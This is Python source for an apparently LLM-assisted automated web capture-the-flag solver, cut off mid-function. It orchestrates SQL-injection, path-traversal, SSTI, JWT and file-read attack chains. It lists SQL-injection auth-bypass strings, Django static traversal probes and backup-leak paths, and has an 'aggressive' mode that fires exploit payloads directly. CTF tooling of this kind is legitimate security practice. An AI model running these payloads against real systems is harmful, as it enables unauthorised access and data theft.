"""Minimal deterministic CTF dispatcher for /ctf execution mode."""

from __future__ import annotations

import asyncio
import base64
import hashlib
import hmac
import json
import os
import re
import socket
import sys
import struct
import tempfile
import time
import uuid
import zipfile
from dataclasses import dataclass, field
from html.parser import HTMLParser
from pathlib import Path
from typing import Any, Awaitable, Callable
from urllib.parse import parse_qs, quote, quote_plus, urlencode, urljoin, urlparse

try:
    import jwt as _pyjwt  # type: ignore[import-not-found]
except Exception:
    _pyjwt = None

from ...tools.notes import get_all_notes_sync, notes as notes_tool
from ...tools.tool_guard import ToolGuard, ToolMissingError
from ...llm.utils import parse_llm_json
from ...harness.artifact_registry import ArtifactRegistry
from ...harness.audit_events import (
    build_artifact_registered_event,
    build_checkpoint_written_event,
    build_missing_tools_recorded_event,
    build_recovery_decision_event,
    build_task_finished_event,
    build_tool_called_event,
    build_tool_finished_event,
    build_verification_decision_event,
)
from ...harness.checkpoint_store import CheckpointStore
from ...harness.session_ledger import SessionLedger
from .chains.base import _ChainOutcome
from .chains.file_read import LFIChainMixin
from .chains.injection import GenericInjectionChainMixin
from .chains.jwt import JWTChainMixin
from .chains.misc import MiscChainMixin
from .chains.sqli import SQLIChainMixin
from .chains.upload import UploadChainMixin
from .chains.web import WebChainMixin
from .chains.xss import XSSChainMixin
from .coordinator import CTFCoordinator
from .flag_parser import FlagParserMixin
from .flag_proof import FlagProofMixin
from .capability_registry import CapabilityRegistry
from .ctf_state import CTFState, FlagProof, LLMStepLog
from .flag_observer import FlagObserverMixin
from .hypothesis_engine import HypothesisEngine
from .jwt_executor import JWTExecutorMixin
from .llm_executor import LLMExecutorMixin
from .note_store import NoteStoreMixin
from .platform_executor import PlatformExecutorMixin
from .platform_orchestrator import PlatformTaskOrchestrator
from .progress_tracker import ProgressTrackerMixin
from .reasoning import PreActionReasoning, ReasoningLayer
from .recon_executor import ReconExecutorMixin
from .recovery import RecoveryController
from .strategy_registry import StrategyContext, StrategyRegistry
from .strategy_memory import ChallengeFingerprint, StrategyMemoryStore
from .ctf_planner import (
    detect_type,
    find_auth_form,
    find_writable_field_name,
    get_ctf_chain,
)
from .verifier import CTFVerifier
from ...knowledge.retrospective import export_ctf_session_retrospective
from .dispatcher_helpers import *  # noqa: F401,F403  # extracted helpers/consts, re-exported
from .collector_server import _CollectorServer


# _FLAG_RE / _STRICT_FLAG_RE / _SCRIPT_SRC_RE / _BACKUP_CLUE_RE moved to dispatcher_helpers.py (re-exported via import *)
_ATTACHMENT_CLUE_RE = re.compile(
    r"(sqlite|\.db\b|\.sqlite\b|\.sqlite3\b|\.wal\b|write-ahead log|forensics|附件|压缩包|archive|directory listing)",
    re.IGNORECASE,
)
_COMMON_BACKUP_PATHS = (
    "/www.zip",
    "/backup.zip",
    "/source.zip",
    "/web.zip",
    "/site.zip",
    "/www.tar.gz",
    "/backup.tar.gz",
    "/index.php.bak",
    "/index.php~",
    "/index.phps",
    "/.git/HEAD",
)
_DJANGO_STATIC_SOURCE_PROBES = (
    "/static../views.py",
    "/static../settings.py",
    "/static../urls.py",
    "/static../models.py",
    "/static../app/views.py",
    "/static../main/views.py",
    "/static../urlstorage/views.py",
    "/static/../views.py",
    "/static/../settings.py",
    "/static/../urls.py",
    "/static/../models.py",
)
_SOURCE_HINT_BACKUP_PROBES = {
    "app.py": ("/app.py.bak", "/app.py~", "/app.py.swp"),
    "index.php": ("/index.php.bak", "/index.php~", "/index.phps"),
    "package.json": ("/package.json.bak", "/package.json~"),
    "requirements.txt": ("/requirements.txt.bak", "/requirements.txt~"),
    "README.md": ("/README.md.bak", "/README.md~"),
}
_SQLI_AUTH_BYPASS_PAYLOADS = (
    "1' or 1=1#",
    "admin' or '1'='1' -- -",
    "' or 1=1#",
)
_CONTACT_POW_CHALLENGE_RE = re.compile(r"\b(\d+_[A-Za-z0-9]+)\b")
_WEBISH_TYPES = {"auto", "web", "xss", "sqli", "lfi", "cmdi", "ssrf", "upload"}
_HTML_TAG_PSEUDO_PATHS = {
    "/a",
    "/article",
    "/aside",
    "/body",
    "/button",
    "/canvas",
    "/div",
    "/fieldset",
    "/figure",
    "/footer",
    "/form",
    "/h1",
    "/h2",
    "/h3",
    "/h4",
    "/h5",
    "/h6",
    "/head",
    "/header",
    "/html",
    "/img",
    "/input",
    "/label",
    "/legend",
    "/li",
    "/link",
    "/main",
    "/meta",
    "/nav",
    "/ol",
    "/option",
    "/p",
    "/script",
    "/section",
    "/small",
    "/span",
    "/style",
    "/svg",
    "/table",
    "/tbody",
    "/td",
    "/textarea",
    "/tfoot",
    "/th",
    "/thead",
    "/title",
    "/tr",
    "/ul",
}

_STATIC_RESOURCE_SUFFIXES = (
    ".avif",
    ".bmp",
    ".css",
    ".eot",
    ".gif",
    ".ico",
    ".jpeg",
    ".jpg",
    ".js",
    ".map",
    ".mjs",
    ".mp3",
    ".mp4",
    ".ogg",
    ".otf",
    ".png",
    ".svg",
    ".ttf",
    ".wav",
    ".webm",
    ".webp",
    ".woff",
    ".woff2",
)
_SERVER_SIDE_PATH_SUFFIXES = (
    ".asp",
    ".aspx",
    ".bak",
    ".cgi",
    ".do",
    ".gz",
    ".htaccess",
    ".html",
    ".inc",
    ".ini",
    ".jar",
    ".jsp",
    ".json",
    ".log",
    ".php",
    ".phps",
    ".phtml",
    ".pl",
    ".py",
    ".rb",
    ".sh",
    ".sql",
    ".swp",
    ".tar",
    ".tar.gz",
    ".txt",
    ".xml",
    ".yaml",
    ".yml",
    ".zip",
)
_CHAIN_NAME_FOR_HYPOTHESIS = {
    "artifact_forensics": "misc",
    "auth_form_sqli": "sqli",
    "generic_param_sqli": "sqli",
    "backup_source_leak": "web",
    "contact_report_chain": "web",
    "unicode_numeric_form_bypass": "web",
    "php_unserialize_magic_method": "web",
    "xss_admin_bot_sid": "xss",
    "lfi": "lfi",
    "cmdi": "cmdi",
    "ssrf": "ssrf",
    "upload": "upload",
    "generic_web_recon": "web",
    # 结构感知假设（Phase 0.5 easy_tornado 补全）
    "hint_chain_followup": "web",
    "file_read_endpoint": "web",
    "path_traversal": "web",
    "hash_guarded_file_read": "web",
    "hash_reconstruction_attack": "web",
    "ssti_via_render_parameter": "web",
    "tornado_ssti": "web",
    # Phase 7: three-stage SSTI pipeline
    "ssti_probe": "web",
    "ssti_identify": "web",
    "ssti_exploit": "web",
}


@dataclass
class SolveResult:
    success: bool
    flag: str | None = None
    chain_used: list[str] = field(default_factory=list)
    notes: list[str] = field(default_factory=list)
    missing_tools: list[str] = field(default_factory=list)
    reason: str = ""


class CTFTaskDispatcher(
    LLMExecutorMixin,
    ReconExecutorMixin,
    FlagObserverMixin,
    FlagParserMixin,
    FlagProofMixin,
    JWTExecutorMixin,
    NoteStoreMixin,
    PlatformExecutorMixin,
    ProgressTrackerMixin,
    GenericInjectionChainMixin,
    LFIChainMixin,
    MiscChainMixin,
    JWTChainMixin,
    UploadChainMixin,
    SQLIChainMixin,
    XSSChainMixin,
    WebChainMixin,
):
    def __init__(
        self,
        runtime,
        progress_callback: Callable[[str], None] | None = None,
        collector_port: int = 7777,
        verification_callback: Callable[[str], Any] | None = None,
        llm: Any | None = None,
        exploitation_mode: str = "aggressive",
    ):
        self.runtime = runtime
        self.progress_callback = progress_callback
        self.collector_port = collector_port
        self.llm = llm
        # "aggressive" (CTF default): take the shortest chain to the flag — fire
        # specific exploit payloads directly. "conservative" (pentest): gate
        # specific exploitation on prior vuln-class confirmation (info-gathering
        # first). See _ssti_exploitation_gated_by_mode.
        self.exploitation_mode = str(exploitation_mode or "aggressive").strip().lower() or "aggressive"
        self.tool_guard = ToolGuard(runtime=runtime)
        self._notes_log: list[str] = []
        self.state: CTFState | None = None
        self.hypothesis_engine = HypothesisEngine()
        self.recovery_controller = RecoveryController(self.hypothesis_engine)
        self.strategy_registry = StrategyRegistry.build_default()
        self.capability_registry = CapabilityRegistry.build_default(
            runtime=runtime,
            tool_guard=self.tool_guard,
            collector_port=collector_port,
        )
        self.strategy_memory = StrategyMemoryStore()
        self.reasoning_layer = ReasoningLayer()
        self.platform_orchestrator = PlatformTaskOrchestrator()
        self._current_fingerprint: ChallengeFingerprint | None = None
        self._memory_match_ids: list[str] = []
        self._pending_wrong_flag_feedback: list[dict[str, str]] = []
        self._active_hypothesis_context = None
        self._active_strategy_context = None
        self._exhausted_visit_url_targets: set[str] = set()
        self._challenge_context: dict[str, Any] | None = None
        self._ingress_handoff: dict[str, Any] | None = None
        self._session_ledger: SessionLedger | None = None
        self._ledger_run_id: str | None = None
        self._artifact_registry: ArtifactRegistry | None = None
        self._artifact_run_id: str | None = None
        self._checkpoint_store: CheckpointStore | None = None
        self._checkpoint_run_id: str | None = None
        self._restored_resume_checkpoint_id: str | None = None
        self._local_challenge_artifacts_loaded = False
        self._registered_local_source_hints_loaded = False
        self._failover_monitor = None
        self._failover_monitor_owned = False
        self.coordinator = CTFCoordinator()
        self.verifier = CTFVerifier(
            runtime=runtime,
            confirmation_callback=verification_callback,
        )

    async def run(
        self,
        target: str,
        goal: str,
        type: str | None = None,
        hint: str | None = None,
        submit_profile: dict[str, Any] | None = None,
        challenge_context: dict[str, Any] | None = None,
        ingress_handoff: dict[str, Any] | None = None,
        run_id: str | None = None,
        ledger_root: str | Path | None = None,
        checkpoint_root: str | Path | None = None,
    ) -> SolveResult:
        # Façade (slice 1c): the public entry always delegates to the coordinator,
        # which runs the setup contracts and hands off to _run_solve_loop. The
        # fallback retry supports coordinators whose execute() predates ingress_handoff.
        kwargs = {
            "target": target,
            "goal": goal,
            "type": type,
            "hint": hint,
            "submit_profile": submit_profile,
            "challenge_context": challenge_context,
            "run_id": run_id,
            "ledger_root": ledger_root,
            "checkpoint_root": checkpoint_root,
        }
        try:
            return await self.coordinator.execute(
                self,
                **kwargs,
                ingress_handoff=ingress_handoff,
            )
        except TypeError as exc:
            if "ingress_handoff" not in str(exc):
                raise
            return await self.coordinator.execute(self, **kwargs)

    def _structured_followup_next_action(self) -> str:
        handoff = self._ingress_handoff if isinstance(self._ingress_handoff, dict) else {}
        return str(handoff.get("nextAction") or "").strip()

    def _structured_followup_value(self, key: str) -> str:
        handoff = self._ingress_handoff if isinstance(self._ingress_handoff, dict) else {}
        return str(handoff.get(key) or "").strip()

    def _record_ingress_handoff_observations(
        self,
        ingress_handoff: dict[str, Any],
    ) -> None:
        if self.state is None or not isinstance(ingress_handoff, dict):
            return
        resume_bootstrap = ingress_handoff.get("resumeBootstrap")
        if not isinstance(resume_bootstrap, dict):
            return
        summary = str(resume_bootstrap.get("summary") or "").strip()
        run_id = str(resume_bootstrap.get("runId") or "").strip()
        checkpoint_id = str(resume_bootstrap.get("checkpointId") or "").strip()
        if not any([summary, run_id, checkpoint_id]):
            return
        metadata = {
            "decision_kind": str(ingress_handoff.get("decisionKind") or "").strip(),
            "next_action": str(ingress_handoff.get("nextAction") or "").strip(),
            "run_id": run_id,
            "checkpoint_id": checkpoint_id,
        }
        observation_value = summary or f"resume from {checkpoint_id or run_id}"
        if any(
            obs.kind == "resume_bootstrap_hint"
            and obs.source == "ingress_handoff"
            and obs.value == observation_value
            and getattr(obs, "metadata", {}) == metadata
            for obs in self.state.observations
        ):
            return
        self.state.add_observation(
            "resume_bootstrap_hint",
            observation_value,
            source="ingress_handoff",
            metadata=metadata,
        )

    async def _run_solve_loop(
        self,
        *,
        target: str,
        hint: str,
        page_features: dict[str, Any],
        detected_type: str,
        chain_order: list[str],
        result: SolveResult | None = None,
    ) -> SolveResult:
        """Run the chain/exploit solve loop over a prepared chain_order.

        Dedicated seam between the coordinator's setup phase and the actual
        solving loop (façade slices 1a–1c). The coordinator calls this directly
        once all setup contracts have run; ``run`` is now a thin façade that
        always delegates to ``coordinator.execute``, so the old dual-purpose
        re-entry and its ``_*_ready`` skip-flags are gone. ``result`` defaults to
        a fresh ``SolveResult`` when omitted.
        """
        if result is None:
            result = SolveResult(success=False)
        chain_order = list(dict.fromkeys(chain_order))

        no_progress_rounds = 0
        chain_index = 0
        while chain_index < len(chain_order):
            chain_name = chain_order[chain_index]
            result.chain_used.append(chain_name)
            self._restore_context()
            before_state = self._snapshot_flag_counts()
            iteration_contract = self.coordinator._prepare_chain_iteration_contract(
                self,
                chain_name=chain_name,
                target=target,
                page_features=page_features,
                hint=hint,
                chain_order=chain_order,
            )
            active_hypothesis = iteration_contract["active_hypothesis"]
            strategy = iteration_contract["strategy"]
            capability_primitive = iteration_contract["capability_primitive"]
            capability_choice = iteration_contract["capability_choice"]
            self._active_hypothesis_context = active_hypothesis
            self._active_strategy_context = strategy
            experiment = iteration_contract["experiment"]

            try:
                outcome = await self._execute_chain(
                    chain_name=chain_name,
                    target=target,
                    page_features=page_features,
                    hint=hint,
                )
            except ToolMissingError as exc:
                self._active_hypothesis_context = None
                self._active_strategy_context = None
                missing_names = sorted(exc.missing)
                if os.getenv("FLAGHUNTER_AUTO_INSTALL", "false").lower() == "true":
                    for name in missing_names:
                        ok = await self.tool_guard.install_and_verify(name)
                        self._emit(f"[CTF dispatcher] auto-install {name}: {'ok' if ok else 'failed'}")
                    continue
                recovery_contract = await self.coordinator._apply_missing_tools_recovery_contract(
                    self,
                    chain_name=chain_name,
                    chain_index=chain_index,
                    chain_order=chain_order,
                    missing_names=missing_names,
                    result=result,
                    target=target,
                    active_hypothesis=active_hypothesis,
                    experiment=experiment,
                )
                if recovery_contract["continue_loop"]:
                    chain_order = list(recovery_contract["chain_order"])
                    chain_index = int(recovery_contract["next_chain_index"])
                    continue
                return recovery_contract["final_result"]
            finally:
                self._active_hypothesis_context = None
                self._active_strategy_context = None
            wrong_flag_result = await self.coordinator._apply_wrong_flag_early_stop_contract(
                self,
                result=result,
                outcome=outcome,
                target=target,
                chain_name=chain_name,
            )
            if wrong_flag_result is not None:
                return wrong_flag_result
            terminal_result = await self.coordinator._apply_terminal_success_contract(
                self,
                result=result,
                outcome=outcome,
                chain_name=chain_name,
                active_hypothesis=active_hypothesis,
                experiment=experiment,
            )
            if terminal_result is not None:
                return terminal_result

            progress_contract = self.coordinator._apply_progress_evaluation_contract(
                self,
                chain_name=chain_name,
                before_state=before_state,
                outcome=outcome,
                no_progress_rounds=no_progress_rounds,
                active_hypothesis=active_hypothesis,
                experiment=experiment,
            )
            progress_delta = progress_contract["progress_delta"]
            effective_progress = progress_contract["effective_progress"]
            no_progress_rounds = int(progress_contract["no_progress_rounds"])
            # Phase 7 §1: Devil's Advocate abort_condition 提前剪枝
            if self.state is not None:
                _aborted = self.hypothesis_engine.update_after_chain(
                    self.state,
                    observed_signal=outcome.reason if outcome is not None else chain_name,
                )
                if _aborted:
                    self._emit(
                        f"[CTF hypothesis] abort_condition 命中，提前终止假设: "
                        + ", ".join(h.kind for h in _aborted)
                    )
            recovery_contract = await self.coordinator._apply_after_chain_recovery_contract(
                self,
                chain_name=chain_name,
                chain_index=chain_index,
                chain_order=chain_order,
                result=result,
                target=target,
                active_hypothesis=active_hypothesis,
                effective_progress=effective_progress,
                no_progress_rounds=no_progress_rounds,
            )
            no_progress_rounds = int(recovery_contract["no_progress_rounds"])
            if recovery_contract["continue_loop"]:
                chain_order = list(recovery_contract["chain_order"])
                chain_index = int(recovery_contract["next_chain_index"])
                continue
            if recovery_contract["final_result"] is not None:
                return recovery_contract["final_result"]
            chain_index = int(recovery_contract["next_chain_index"])

        return await self.coordinator._apply_final_recovery_contract(
            self,
            result=result,
            target=target,
            detected_type=detected_type,
            no_progress_rounds=no_progress_rounds,
        )

    async def _finalize_solve_result(self, result: SolveResult) -> SolveResult:
        result.notes = list(self._notes_log)
        if self.state is None:
            finished_event = build_task_finished_event(
                success=result.success,
                flag=result.flag or "",
                reason=result.reason or "",
                chain_used=list(result.chain_used),
                missing_tools=list(result.missing_tools),
            )
            self._record_session_event(
                str(finished_event.get("event_type") or "task_finished"),
                dict(finished_event.get("payload") or {}),
            )
            await self._stop_failover_monitor_if_owned()
            return result

        if not result.success and self._pending_wrong_flag_feedback:
            latest_wrong = self._pending_wrong_flag_feedback[-1]
            previous_reason = str(result.reason or self.state.stop_reason or "").strip()
            result.reason = f"wrong flag feedback: {latest_wrong.get('flag', '')}"
            if previous_reason and "wrong flag feedback" not in previous_reason.lower():
                result.reason += f" | previous={previous_reason}"

        reason = result.reason or self.state.stop_reason or ""
        self.state.stop_reason = reason
        if not self.state.retrospectives and reason:
            self.reasoning_layer.record_retrospective(
                self.state,
                trigger="stop",
                reason=reason,
            )

        missing_capabilities = list(result.missing_tools)

        if self._current_fingerprint is None:
            self._current_fingerprint = self.strategy_memory.build_fingerprint(self.state)
        entry = self.strategy_memory.build_entry(
            state=self.state,
            fingerprint=self._current_fingerprint,
            chain_used=result.chain_used,
            solved=result.success,
        )
        await self.strategy_memory.save(entry)
        self.state.meta_reasonings.append(
            {
                "type": "strategy_memory_session_entry",
                "entry_id": entry.id,
                "solved": result.success,
                "chain_used": list(result.chain_used),
            }
        )
        skip_standard_outcome_update = False
        if not result.success and self._pending_wrong_flag_feedback:
            latest_wrong = self._pending_wrong_flag_feedback[-1]
            wrong_audit = await self.strategy_memory.apply_rejected_feedback(
                self._memory_match_ids,
                session_entry_id=entry.id,
            )
            skip_standard_outcome_update = True
            self.state.meta_reasonings.append(
                {
                    "type": "strategy_memory_wrong_flag_audit",
                    "wrong_flag": latest_wrong.get("flag"),
                    "rationale": latest_wrong.get("rationale"),
                    "matched_entry_ids": list(self._memory_match_ids),
                    **wrong_audit,
                }
            )
        if self._memory_match_ids and not skip_standard_outcome_update:
            updated_entries = await self.strategy_memory.record_outcome(
                self._memory_match_ids,
                solved=result.success,
            )
            updated_entries = updated_entries or []
            suggested_mute_entry_ids = [
                entry.id
                for entry in updated_entries
                if (
                    not result.success
                    and entry.metadata.manual_status == "active"
                )
            ]
            auto_muted_entry_ids = [
                entry.id
                for entry in updated_entries
                if entry.metadata.manual_status == "muted"
            ]
            rollback_candidate_entry_ids = [
                entry.id
                for entry in updated_entries
                if result.success and entry.metadata.manual_status == "active"
            ]
            self.state.meta_reasonings.append(
                {
                    "type": "strategy_memory_outcome_audit",
                    "matched_entry_ids": list(self._memory_match_ids),
                    "solved": result.success,
                    "entries": [
                        {
                            "id": entry.id,
                            "manual_status": entry.metadata.manual_status,
                            "applied_count": entry.metadata.applied_count,
                            "successful_applications": entry.metadata.successful_applications,
                            "failed_applications": entry.metadata.failed_applications,
                            "success_correlation": entry.metadata.success_correlation,
                        }
                        for entry in updated_entries
                    ],
                    "suggested_mute_entry_ids": suggested_mute_entry_ids,
                    "auto_muted_entry_ids": auto_muted_entry_ids,
                    "rollback_candidate_entry_ids": rollback_candidate_entry_ids,
                }
            )
        stop_report = self.reasoning_layer.generate_stop_report(
            self.state,
            reason=reason,
            missing_capabilities=missing_capabilities,
        )
        self.state.stop_report = stop_report.to_dict()
        finished_event = build_task_finished_event(
            success=result.success,
            flag=result.flag or "",
            reason=reason,
            chain_used=list(result.chain_used),
            missing_tools=list(result.missing_tools),
        )
        finished_checkpoint_payload = dict(finished_event.get("payload") or {})
        rejected_flags = [
            str(record.value).strip()
            for record in list(self.state.rejected_flags)
            if str(record.value).strip()
        ]
        if rejected_flags:
            finished_checkpoint_payload["rejected_flags"] = rejected_flags
        self._record_session_event(
            str(finished_event.get("event_type") or "task_finished"),
            dict(finished_event.get("payload") or {}),
        )
        self._write_checkpoint(
            "task_finished",
            finished_checkpoint_payload,
        )
        await self._stop_failover_monitor_if_owned()
        try:
            export_ctf_session_retrospective(self.state, result)
        except Exception:
            pass
        return result

    async def _start_failover_monitor_if_available(self) -> None:
        if self._failover_monitor is not None:
            return
        try:
            import flaghunter.cpa_modules.m1_api_hub as m1_api_hub  # noqa: PLC0415

            if not m1_api_hub.is_m1_enabled():
                return
            try:
                self._failover_monitor = m1_api_hub.get_failover_monitor()
                self._failover_monitor_owned = False
                return
            except Exception:
                pass

            try:
                await m1_api_hub.init_m1()
            except Exception:
                self._failover_monitor = None
                self._failover_monitor_owned = False
                return

            try:
                self._failover_monitor = m1_api_hub.get_failover_monitor()
                self._failover_monitor_owned = self._failover_monitor is not None
            except Exception:
                self._failover_monitor = None
                self._failover_monitor_owned = False
        except Exception:
            self._failover_monitor = None
            self._failover_monitor_owned = False

    async def _stop_failover_monitor_if_owned(self) -> None:
        monitor = self._failover_monitor
        owned = self._failover_monitor_owned
        self._failover_monitor = None
        self._failover_monitor_owned = False
        if not owned or monitor is None:
            return
        stop = getattr(monitor, "stop", None)
        if stop is None:
            return
        try:
            result = stop()
            if hasattr(result, "__await__"):
                await result
        except Exception:
            return

    def _select_primary_strategy(
        self,
        chain_name: str,
        *,
        target: str,
        page_features: dict[str, Any],
        hint: str,
    ):
        strategies = self._strategies_for_chain(
            chain_name,
            target=target,
            page_features=page_features,
            hint=hint,
            extras={"base_target": _base_target(target)},
        )
        if chain_name == "web":
            normalized_hint = str(hint or "")
            structured_next_action = self._structured_followup_next_action()
            structured_switched_from = self._structured_followup_value("switchedFrom").lower()
            structured_trigger_reason = self._structured_followup_value("triggerReason").lower()
            structured_trigger_action_driver = self._structured_followup_value("triggerActionDriver").lower()
            if (
                (
                    "nextAction=exploit_identified_engine" in normalized_hint
                    or structured_next_action == "exploit_identified_engine"
                    or (
                        (
                            structured_switched_from == "probe_discovered_endpoint"
                            or structured_trigger_action_driver == "blackboard.discovered_endpoint"
                        )
                        and (
                            "template engine" in structured_trigger_reason
                            or "identified engine" in structured_trigger_reason
                            or "engine primitive" in structured_trigger_reason
                        )
                    )
                )
                and self.state is not None
                and any(
                    str(getattr(observation, "kind", "") or "").strip() == "ssti_engine_identified"
                    for observation in list(self.state.observations)
                )
            ):
                for strategy in strategies:
                    if str(getattr(strategy, "kind", "") or "").strip() == "ssti_exploit":
                        return strategy
            if (
                (
                    "nextAction=validate_leaked_secret" in normalized_hint
                    or structured_next_action == "validate_leaked_secret"
                    or (
                        (
                            structured_switched_from == "probe_discovered_endpoint"
                            or structured_trigger_action_driver in {
                                "blackboard.discovered_endpoint",
                                "blackboard.leaked_secret",
                            }
                        )
                        and (
                            "cookie secret" in structured_trigger_reason
                            or "guarded file" in structured_trigger_reason
                            or "filehash" in structured_trigger_reason
                            or structured_trigger_action_driver == "blackboard.leaked_secret"
                        )
                    )
                )
                and self.state is not None
                and any(
                    str(getattr(observation, "kind", "") or "").strip() == "cookie_secret_leaked"
                    for observation in list(self.state.observations)
                )
            ):
                for strategy in strategies:
                    if str(getattr(strategy, "kind", "") or "").strip() == "hash_guarded_file_read":
                        return strategy
            if (
                (
                    structured_next_action == "collect_initial_facts"
                    or structured_switched_from == "probe_discovered_endpoint"
                    or structured_trigger_action_driver == "blackboard.discovered_endpoint"
                )
                and (
                    "source leak" in structured_trigger_reason
                    or "backup" in structured_trigger_reason
                    or "artifact" in structured_trigger_reason
                    or "source archive" in structured_trigger_reason
                    or "zip" in structured_trigger_reason
                    or "source bundle" in structured_trigger_reason
                )
            ):
                for strategy in strategies:
                    if str(getattr(strategy, "kind", "") or "").strip() == "backup_source_leak":
                        return strategy
            if (
                (
                    structured_next_action == "collect_initial_facts"
                    or structured_switched_from == "probe_discovered_endpoint"
                    or structured_trigger_action_driver == "blackboard.discovered_endpoint"
                )
                and (
                    "unserialize" in structured_trigger_reason
                    or "magic method" in structured_trigger_reason
                    or "__destruct" in structured_trigger_reason
                    or "deserial" in structured_trigger_reason
                )
            ):
                for strategy in strategies:
                    if str(getattr(strategy, "kind", "") or "").strip() == "php_unserialize_magic_method":
                        return strategy
            if self._recent_php_unserialize_source_exploit():
                for strategy in strategies:
                    if str(getattr(strategy, "kind", "") or "").strip() == "php_unserialize_magic_method":
                        return strategy
            source_hint_text = self._recent_local_source_hint_text().lower()
            if "filename" in source_hint_text and "filehash" in source_hint_text:
                for strategy in strategies:
                    if str(getattr(strategy, "kind", "") or "").strip() == "hash_guarded_file_read":
                        return strategy
        if chain_name == "web" and self._has_recent_local_source_hint():
            for strategy in strategies:
                if str(getattr(strategy, "kind", "") or "").strip() == "backup_source_leak":
                    return strategy
        return strategies[0] if strategies else None

    def _has_recent_local_source_hint(self, *, limit: int = 6) -> bool:
        if self.state is None:
            return False
        return bool(
            self.state.recent_observations(
                "local_challenge_source_hint",
                limit=limit,
            )
        )

    def _recent_local_source_hint_count(self, *, limit: int = 12) -> int:
        if self.state is None:
            return 0
        return len(
            self.state.recent_observations(
                "local_challenge_source_hint",
                limit=limit,
            )
        )

    def _recent_source_hint_backup_probe_paths(self, *, limit: int = 6) -> list[str]:
        if self.state is None:
            return []

        discovered_names: list[str] = []
        seen_names: set[str] = set()
        for observation in self.state.recent_observations(
            "local_challenge_source_hint",
            limit=limit,
        ):
            metadata = getattr(observation, "metadata", None)
            file_name = ""
            if isinstance(metadata, dict):
                file_name = str(metadata.get("file_name") or "").strip()
                if not file_name:
                    path_value = str(metadata.get("path") or "").strip()
                    if path_value:
                        file_name = Path(path_value).name
            if not file_name:
                value = str(getattr(observation, "value", "") or "")
                match = re.match(r"([A-Za-z0-9_.-]+):", value.strip())
                if match:
                    file_name = match.group(1).strip()
            if file_name and file_name not in seen_names:
                seen_names.add(file_name)
                discovered_names.append(file_name)

        probe_paths: list[str] = []
        seen_paths: set[str] = set()
        for name in discovered_names:
            for rel_path in _SOURCE_HINT_BACKUP_PROBES.get(name, ()):
                if rel_path not in seen_paths:
                    seen_paths.add(rel_path)
                    probe_paths.append(rel_path)
        return probe_paths

    def _recent_local_source_hint_text(self, *, limit: int = 6) -> str:
        if self.state is None:
            return ""
        return "\n".join(
            str(getattr(observation, "value", "") or "")
            for observation in self.state.recent_observations(
                "local_challenge_source_hint",
                limit=limit,
            )
        )

    def _recent_local_source_hint_routes(self, *, limit: int = 6) -> set[str]:
        text = self._recent_local_source_hint_text(limit=limit)
        if not text:
            return set()
        routes: set[str] = set()
        for match in re.findall(r"['\"](\/[A-Za-z0-9_./-]+)['\"]", text):
            normalized = str(match or "").strip()
            if normalized.startswith("/"):
                routes.add(normalized)
        return routes

    def _recent_local_source_hint_secret_candidates(self, *, limit: int = 6) -> list[str]:
        text = self._recent_local_source_hint_text(limit=limit)
        if not text:
            return []
        candidates: list[str] = []
        patterns = (
            r"(?i)(?:jwt_secret|secret_key|token_secret|signing_secret)\s*[:=]\s*['\"]([^'\"]+)['\"]",
            r"(?i)(?:jwt_secret|secret_key|token_secret|signing_secret)\s*[:=]\s*([A-Za-z0-9_.:/@\-]{6,})",
        )
        for pattern in patterns:
            for match in re.findall(pattern, text):
                value = str(match or "").strip()
                if value:
                    candidates.append(value)
        ordered: list[str] = []
        seen: set[str] = set()
        for item in candidates:
            if item not in seen:
                seen.add(item)
                ordered.append(item)
        return ordered

    def _looks_like_source_code_blob(self, text: str) -> bool:
        blob = str(text or "").strip()
        if not blob:
            return False
        if _looks_like_inline_source_leak(blob):
            return True
        lowered = blob.lower()
        strong_markers = (
            "<?php",
            "$_get",
            "$_post",
            "shell_exec(",
            "highlight_file(",
            "@app.route(",
            "from flask import",
            "express(",
            "app.get(",
            "app.post(",
        )
        if any(marker in lowered for marker in strong_markers):
            return True
        if ("def " in lowered and "import " in lowered) or ("class " in lowered and "function " in lowered):
            return True
        return False

    def _register_runtime_source_hint(
        self,
        text: str,
        hint_path: str,
        *,
        evidence_source: str,
        max_chars: int = 1600,
    ) -> bool:
        if self.state is None:
            return False
        if not self._looks_like_source_code_blob(text):
            return False

        normalized_path = str(hint_path or "").strip()
        parsed = urlparse(normalized_path)
        candidate_name = Path(parsed.path).name if parsed.path else ""
        if not candidate_name and parsed.netloc:
            candidate_name = parsed.netloc
        file_name = candidate_name or "runtime_source"

        snippet = str(text or "").strip()
        if len(snippet) > max_chars:
            snippet = snippet[: max_chars - 3].rstrip() + "..."
        value = f"{file_name}: {snippet}"

        for observation in reversed(
            self.state.recent_observations(
                "local_challenge_source_hint",
                limit=12,
            )
        ):
            if str(getattr(observation, "value", "") or "").strip() == value:
                return False
            metadata = getattr(observation, "metadata", None)
            if isinstance(metadata, dict) and str(metadata.get("path") or "").strip() == normalized_path:
                return False

        self.state.add_observation(
            "local_challenge_source_hint",
            value,
            source="runtime_source_leak",
            metadata={
                "path": normalized_path,
                "file_name": file_name,
                "evidence_source": evidence_source,
            },
        )
        return True

    def _extract_followup_fetch_targets(self, text: str) -> list[str]:
        blob = str(text or "")
        if not blob:
            return []

        targets: list[str] = []
        seen: set[str] = set()

        def _append(value: str) -> None:
            normalized = str(value or "").strip().rstrip(".,;:!?)\"]'")
            if not normalized or normalized in seen:
                return
            seen.add(normalized)
            targets.append(normalized)

        loopback_urls = re.findall(
            r"https?://(?:127\.0\.0\.1|localhost)[^\s\"'<>]+",
            blob,
            flags=re.IGNORECASE,
        )
        for url in loopback_urls:
            _append(url)

        allowed_prefixes = (
            "/app/",
            "/etc/",
            "/flag",
            "/home/",
            "/opt/",
            "/proc/",
            "/run/",
            "/sandbox/",
            "/srv/",
            "/tmp/",
            "/usr/",
            "/var/",
        )
        for raw_path in re.findall(r"(?<![A-Za-z0-9_])(/(?:[A-Za-z0-9_.-]+/)*[A-Za-z0-9_.-]{1,160})", blob):
            path = str(raw_path or "").strip().rstrip(".,;:!?)\"]'")
            if not path or path in _HTML_TAG_PSEUDO_PATHS:
                continue
            leaf = path.rsplit("/", 1)[-1]
            if not (
                path == "/flag"
                or path == "/flag.txt"
                or path.startswith(allowed_prefixes)
                or "." in leaf
            ):
                continue
            _append(f"file://{path}")

        return targets

    def _jwt_target_candidates(self, base: str, page_features: dict[str, Any]) -> list[str]:
        candidates: list[str] = []
        seen: set[str] = set()

        def _add(url: str) -> None:
            normalized = str(url or "").strip()
            if not normalized or normalized in seen:
                return
            seen.add(normalized)
            candidates.append(normalized)

        route_candidates: set[str] = set()
        route_candidates.update(
            str(item).strip()
